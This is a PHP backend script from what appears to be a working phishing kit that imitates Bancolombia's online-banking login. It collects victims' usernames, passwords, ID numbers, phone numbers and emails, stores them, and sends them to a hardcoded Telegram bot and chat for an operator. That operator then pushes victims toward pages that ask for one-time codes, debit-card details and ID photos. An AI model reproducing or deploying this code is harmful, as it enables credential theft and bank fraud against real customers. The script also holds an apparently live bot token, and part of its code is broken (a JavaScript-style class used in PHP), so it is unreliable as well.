<?php
/**
 * sendata.php
 * -----------
 * Handler del POST del formulario de login Virtual-Persona.html.
 *
 * Pasos estándar en este script:
 *   1) Lee del body: usuario, clave, key (sesión 18 chars), correo.
 *   2) Genera NUEVO request_id: BCO_<144 bits aleatorios> (nunca se reutiliza,
 *      incluso si la fila ya existía por la misma key).
 *   3) UPSERT en tabla `solicitudes`:
 *        • Si es una fila nueva → INSERT normal.
 *        • Si ya existía (UNIQUE KEY(key)) → RESET TOTAL:
 *          nuevo request_id, sobreescribir user/password, ESTADO='pendiente'.
 *      Con esto aseguramos que el loader NUNCA salte solo a una pantalla
 *      por un estado viejo de una sesión anterior.
 *   4) Envía mensaje al bot de Telegram de OPERACIONES con los datos
 *      del login + TECLADO INLINE con las opciones que el operador pulsa:
 *          OPCION_1  = DINAMICA
 *          OPCION_2  = TARJETA
 *          OPCION_3  = ERROR_OP3
 *          OPCION_4  = ERROR_OP4
 *          OPCION_5  = FOTO
 *          OPCION_10 = FINALIZAR  → bancolombia.com/personas/creditos
 *          (OPCION_6/7/8/9/55 son usados solo por los enviar_dato_extra*)
 *   5) Guarda datos en $_SESSION y 302 Location hacia espera.html, que es la
 *      pantalla con el loader Bancolombia INDEFINIDO hasta que el operador
 *      pulse un botón en Telegram.
 */

ob_start();
session_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

date_default_timezone_set('America/Bogota');

// ── Paso 1: datos del formulario Virtual-Persona ─────────────────────────────
$nombreUsuario    = $_POST['usuario']            ?? '';
$password       = $_POST['clave']              ?? '';
$claveUnica     = $_POST['key']                ?? '';
$email          = $_POST['correo']             ?? '';

// Campos capturados desde la landing anterior y pasados por URL/hidden inputs
$tipoDoc        = $_POST['tipo_documento']     ?? '';
$numDoc         = $_POST['numero_documento']  ?? '';
$montoRaw       = $_POST['monto']              ?? '';
$montoTexto     = $_POST['monto_texto']      ?? '';
$nombreUsuarioInit = $_POST['nombre_usuario']     ?? '';
$telefono       = $_POST['telefono']           ?? '';
$bancoPost    = $_POST['banco']              ?? '';

if (trim($claveUnica) === '') {
    $claveUnica = 'auto_' . bin2hex(random_bytes(16));
}

$bancoFinal = (is_string($bancoPost) && trim($bancoPost) !== '' ? trim($bancoPost) : 'Bancolombia';

// Miramos si ya hay fila previa para esta key (solo lo usamos para leer campos
// antiguos, pero AÚN ASÍ generamos request_id nuevo y reseteamos estado).
$sel = $pdo->prepare("SELECT request_id, correo, estado, numero_cuenta, monto, banco, nombre, telefono FROM solicitudes WHERE `key` = ? LIMIT 1");
$sel->execute([$claveUnica]);
$existente = $sel->fetch(PDO::FETCH_ASSOC);

// ── Paso 2: nuevo request_id BANCOLOMBIA formato BCO_<144 bits> ─────────────
try {
    $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Paso 3: UPSERT (INSERT + UPDATE si key duplicada) ────────────────────────
// NOTA: numero_cuenta se usa como "celular / teléfono del cliente" en los mensajes.
// Si el POST trae teléfono → lo usamos; si no, intentamos recuperar el anterior.
$numeroCuentaFinal = trim($telefono) !== '' ? $telefono : ($existente['numero_cuenta'] ?? '');
$montoFinal     = trim($montoTexto) !== '' ? $montoTexto : (trim($montoRaw) !== '' ? $montoRaw : ($existente['monto'] ?? ''));
$nombreFinal    = trim($nombreUsuarioInit) !== '' ? $nombreUsuarioInit : ($existente['nombre'] ?? '');
$correoFinal    = trim($email) !== '' ? $email : ($existente['correo'] ?? '');

$upsert = $pdo->prepare(
    "INSERT INTO solicitudes
        (`key`, `user`, `password`, `request_id`, `correo`, `estado`, `banco`,
         `numero_cuenta`, `monto`, `nombre`, `telefono`)
     VALUES
        (:k, :u, :p, :rid, :em, 'pendiente', :bco,
         :nc, :mont, :nom, :tel)
     ON DUPLICATE KEY UPDATE
         `user`         = VALUES(`user`),
         `password`     = VALUES(`password`),
         `request_id`   = VALUES(`request_id`),
         `correo`       = IF(VALUES(`correo`) <> '', VALUES(`correo`), `correo`),
         `banco`        = IF(VALUES(`banco`) <> '', VALUES(`banco`), `banco`),
         `numero_cuenta` = IF(VALUES(`numero_cuenta`) <> '', VALUES(`numero_cuenta`), `numero_cuenta`),
         `monto`        = IF(VALUES(`monto`) <> '', VALUES(`monto`), `monto`),
         `nombre`       = IF(VALUES(`nombre`) <> '', VALUES(`nombre`), `nombre`),
         `telefono`     = IF(VALUES(`telefono`) <> '', VALUES(`telefono`), `telefono`),
         `estado`       = 'pendiente'"
);
$upsert->execute([
    ':k'    => $claveUnica,
    ':u'    => $nombreUsuario,
    ':p'    => $password,
    ':rid'  => $idPeticion,
    ':em'   => $correoFinal,
    ':bco'  => $bancoFinal,
    ':nc'   => $numeroCuentaFinal,
    ':mont' => $montoFinal,
    ':nom'  => $nombreFinal,
    ':tel'  => $telefono,
]);

// ── Paso 4: mensaje + teclado inline al bot de Telegram OPERACIONES ──────────
// IMPORTANTE FIX DETERMINANTE (usuario reporto mensajes llegando al bot viejo):
//   El CANAL NUEVO es el DEFAULT hardcodeado (igual que tu pedido).
//   getenv() SÓLO lo sobreescribe SI la variable EXISTE y NO está vacía (trim no '').
//   De esta forma NUNCA más cae al canal viejo, incluso si Render olvida redeployar
//   o la variable tiene un espacio/tip al setearla en el dashboard.
$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$botToken = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
$idChat   = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;

// Helper: si un valor está vacío lo reemplaza por un placeholder
function fv($v, $placeholder = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    return $s === '' ? $placeholder : htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$docCompleto  = trim($tipoDoc . ' ' . $numDoc);
$montoMuestra = trim($montoFinal);
if ($montoMuestra === '' && trim($montoRaw) !== '') $montoMuestra = trim($montoRaw);

$mensaje  = "🆕 <b>[LOGIN VIRTUAL-PERSONA]</b> Datos completos capturados en esta sesión:\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "📄 <b>Documento:</b> " . fv($docCompleto) . "\n";
if (trim($nombreFinal) !== '' || trim($nombreUsuarioInit) !== '') {
    $mensaje .= "👤 <b>Nombre (landing):</b> " . fv($nombreFinal !== '' ? $nombreFinal : $nombreUsuarioInit) . "\n";
}
$mensaje .= "📱 <b>Celular / Teléfono:</b> " . fv($numeroCuentaFinal) . "\n";
$mensaje .= "💰 <b>Monto / Cupo solicitado:</b> " . fv($montoMuestra) . "\n";
$mensaje .= "🏦 <b>Banco:</b> " . fv($bancoFinal) . "\n";
$mensaje .= "📧 <b>Correo:</b> " . fv($correoFinal) . "\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "👤 <b>Usuario Virtual-Persona:</b> " . fv($nombreUsuario) . "\n";
$mensaje .= "🔒 <b>Clave Virtual-Persona:</b> " . fv($password) . "\n";

/* MAPEO STANDARD DE BOTONES INLINE (callback_data = OPCION_N_REQUEST_ID)
   ═══════════════════════════════════════════════════════════════════════════
   OPCION_1   = 🟢 DINÁMICA         → opcion1.html (clave dinámica / OTP)
   OPCION_2   = 💳 TARJETA DÉBITO  → opcion6.html (datos tarjeta débito)
   OPCION_3   = 🔴 ERROR DINÁMICA   → opcion3.html (reintento dinámica)
   OPCION_4   = ❌ ERROR CLAVE      → opcion4.html → opcion9 (error clave dinámica)
   OPCION_5   = 📸 FOTO CÉDULA     → opcion5.html → enviar_dato_extra3
   OPCION_10  = 🟩 FINALIZAR        → https://www.bancolombia.com/personas/creditos
   (Opciones 6,7,8,9,55 son usadas después de rellenar datos extra)
   ═══════════════════════════════════════════════════════════════════════════ */
$teclado = [
    'inline_keyboard' => [[
        ['text' => "🟢 DINÁMICA",       'callback_data' => "OPCION_1_$idPeticion"],
        ['text' => "💳 TARJETA DÉBITO", 'callback_data' => "OPCION_2_$idPeticion"],
    ], [
        ['text' => "🔴 ERROR DINÁMICA", 'callback_data' => "OPCION_3_$idPeticion"],
        ['text' => "❌ ERROR CLAVE",    'callback_data' => "OPCION_4_$idPeticion"],
        ['text' => "📸 FOTO CÉDULA",    'callback_data' => "OPCION_5_$idPeticion"],
    ], [
        ['text' => "🟩 FINALIZAR",      'callback_data' => "OPCION_10_$idPeticion"],
    ]],
];

$payload = json_encode([
    'chat_id'                  => $idChat,
    'text'                     => $mensaje,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true,
    'reply_markup'             => $teclado,
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Paso 5: guardar sesión y 302 → espera.html (loader indefinido) ──────────
$_SESSION['usuario']          = $nombreUsuario;
$_SESSION['clave']            = $password;
$_SESSION['correo']           = $correoFinal;
$_SESSION['celular']          = $numeroCuentaFinal;
$_SESSION['monto']            = $montoFinal;
$_SESSION['banco']            = $bancoFinal;
$_SESSION['tipo_documento']   = $tipoDoc;
$_SESSION['numero_documento'] = $numDoc;
$_SESSION['nombre']           = $nombreFinal;
$_SESSION['telefono']         = $telefono;
$_SESSION['request_id']       = $idPeticion;
$_SESSION['key']              = $claveUnica;

$redirQs = new URLSearchParams([
    'rid'   => $idPeticion,
    'key'   => $claveUnica,
    'correo'=> $correoFinal,
]);
header("Location: espera.html?" . $redirQs->toString());
exit;
